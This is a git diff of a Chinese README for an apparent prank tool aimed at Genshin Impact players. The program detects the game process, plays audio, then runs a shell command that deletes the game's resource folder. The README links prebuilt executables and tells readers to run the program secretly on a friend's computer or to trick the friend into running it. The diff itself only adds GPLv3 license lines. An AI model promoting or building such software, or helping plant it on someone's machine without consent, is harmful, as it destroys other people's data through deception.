@@ -4,9 +4,11 @@
 [**点击跳转bilibili**](https://space.bilibili.com/510197857)
 ## 作用
 当后台检测到***YuanShen.exe***时开始播放音频,播放完音频或播放过程中游戏进程消失(游戏关闭)时,__调用Shell指令删除掉原神资源文件夹__***(没错全删了)***,删除过程相当迅速(很快文件就被删光了)
+## 使用源代码
+你可以使用本仓库的源代码进行复制,修改,分发,但是你必须遵守[***GNU GPLv3开源协议***](https://github.com/AEBC08/GiveUp-GenshinImpact/blob/main/LICENSE)
 ## 下载
 你可以使用作者已构建的exe可执行文件在此下载[**点我跳转**](https://github.com/AEBC08/GiveUp-GenshinImpact/releases)  
-当然,如果你对作者的程序不满意可以下载源码进行修改(***但是你必须遵守GNU GPLv3开源协议***),然后再构建exe可执行文件
+当然,如果你对作者的程序不满意可以下载源码进行修改(**但是你必须遵守**[***GNU GPLv3开源协议***](https://github.com/AEBC08/GiveUp-GenshinImpact/blob/main/LICENSE)),然后再构建exe可执行文件
 ## 使用方法
 趁朋友不在的时候偷偷往朋友电脑中运行构建出来的exe可执行文件,或是在线发送给朋友(你可以骗朋友说...,这里作者就不赘述了)
 ## 运行效果
